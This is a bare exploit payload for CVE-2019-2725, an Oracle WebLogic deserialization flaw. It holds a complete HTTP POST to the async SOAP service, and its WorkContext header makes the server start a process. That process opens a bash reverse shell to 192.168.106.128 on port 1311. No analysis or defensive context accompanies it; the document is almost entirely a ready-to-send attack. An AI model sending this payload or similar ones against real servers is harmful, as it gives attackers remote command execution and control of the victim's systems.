CVE-2019-2725

CVE-2019-2725: https://www.cvedetails.com/cve/CVE-2019-2725/

PAYLOAD:
----------------------------------------------------------------------------------------------------------------------------------------
POST /_async/AsyncResponseService HTTP/1.1
Host: 127.0.0.1:49163
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
SOAPAction: 
Content-Type: text/xml
Content-Length: 943
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService">
	<soapenv:Header>
		<wsa:Action>aq32EgOjEiWEU6D5NSxI</wsa:Action>
		<wsa:RelatesTo>7Vk7kyfTG1BQpoJw5E7Z</wsa:RelatesTo>
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
			<void class="java.lang.ProcessBuilder">
				<array class="java.lang.String" length="3">
					<void index="0">
						<string>/bin/bash</string>
					</void>
					<void index="1">
						<string>-c</string>
					</void>
					<void index="2">
						<string>0&lt;&amp;25-;exec 25&lt;&gt;/dev/tcp/192.168.106.128/1311;sh &lt;&amp;25 &gt;&amp;25 2&gt;&amp;25</string>
					</void>
				</array>
			<void method="start"/>
			</void>
		</work:WorkContext>
	</soapenv:Header>
	<soapenv:Body>
		<asy:onAsyncDelivery/>
	</soapenv:Body>
</soapenv:Envelope>
----------------------------------------------------------------------------------------------------------------------------------------
